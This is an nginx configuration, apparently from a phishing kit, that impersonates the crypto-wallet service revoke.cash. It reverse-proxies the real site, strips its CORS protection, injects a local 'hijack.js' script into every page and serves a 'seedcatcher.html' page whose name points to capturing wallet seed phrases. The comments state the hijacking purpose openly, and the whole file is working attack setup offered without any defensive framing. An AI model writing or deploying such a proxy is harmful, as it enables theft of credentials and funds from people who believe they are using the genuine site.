server {
    listen 80;
    root /usr/share/nginx/html;
    index index.html;

    location / {
        proxy_pass https://revoke.cash;
        proxy_ssl_server_name on;
        proxy_set_header Host revoke.cash;
        
        # Strip their CORS block
        proxy_hide_header Access-Control-Allow-Origin;
        add_header Access-Control-Allow-Origin *;
        
        # Inject the hijack script right before </body>
        sub_filter '</body>' '<script src="/hijack.js"></script></body>';
        sub_filter_once on;
    }

    # Serve the hijack script locally
    location /hijack.js {
        alias /usr/share/nginx/html/hijack.js;
    }

    # Serve the seed catcher locally
    location /seedcatcher.html {
        alias /usr/share/nginx/html/seedcatcher.html;
    }
}
